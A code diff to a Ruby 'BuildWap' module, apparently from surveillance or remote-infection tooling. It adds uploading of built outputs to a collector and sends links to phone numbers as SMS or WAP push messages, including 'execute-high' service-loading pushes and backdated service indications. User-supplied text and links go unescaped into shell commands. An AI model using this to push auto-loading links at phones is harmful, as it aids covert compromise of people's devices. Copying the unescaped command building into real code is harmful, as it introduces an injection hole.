@@ -27,8 +27,6 @@ class BuildWap < Build
   def generate(params)
     trace :debug, "Build: generate: #{params}"
 
-    return
-
     # force demo if the RMI is in demo
     params['binary']['demo'] = true if LicenseManager.instance.limits[:rmi][1]
 
@@ -78,28 +76,48 @@ class BuildWap < Build
   def deliver(params)
     trace :debug, "Build: deliver: #{params}"
 
-    #@outputs.each do |o|
-    #  content = File.open(path(o), 'rb') {|f| f.read}
-    #  Frontend.collector_put(o, content)
-    #end
+    @outputs.each do |o|
+      content = File.open(path(o), 'rb') {|f| f.read}
+      Frontend.collector_put(o, content)
+    end
 
-    # TODO: send the sms
+    # sanitize the phone number (no + and no 00 )
+    number = params['number']
+    number.gsub! /\+/, ''
+    number.gsub! /^00/, ''
+
+    # send the sms
     begin
-      CrossPlatform.exec path('wps')
+      case params['type']
+        when 'sms'
+          CrossPlatform.exec path('wps'), "-s sms -n #{number} -t \"#{params['text']} #{params['link']}\""
+        when 'sl'
+          CrossPlatform.exec path('wps'), "-s sl -r execute-high -n #{number} -l #{params['link']}"
+        when 'si'
+          time = (Time.now - 3600).strftime "%Y-%m-%dT%H:%M:%S"
+          CrossPlatform.exec path('wps'), "-s si -r signal-high -n #{number} -l #{params['link']} -t \"#{params['text']}\" -d #{time}"
+      end
     rescue ExecFailed => e
       trace :error, e.message
-
+      error = "SMS delivery failed: "
       case e.exitstatus
-        
+        when 1
+          raise error + "modem error, function not supported or network error"
+        when 2
+          raise error + "message encoding error"
+        when 3
+          raise error + "argument error"
+        when 4
+          raise error + "wrong command line"
+        when 5
+          raise error + "wrong PIN code"
+        when 6
+          raise error + "wrong service type"
+        when 7
+          raise error + "option not available on this modem"
+        when 8
+          raise error + "network error"
       end
-=begin
-      1: errore modem (il modem non supporta le funzioni specificate) o network (il messaggio non viene consegnato)
-      2: errore nel formato del messaggio dopo l'encoding (link + testo + encoding > 140 caratteri)
-      3: errore sugli argomenti (l'autodiscovery ha fallito miseramente, numero di telefono malformato etc...)
-      4: errore sulla commandline (parametri obbligatori mancanti o combinazioni di flag insensate etc...)
-=end
-
-
     end
 
   end
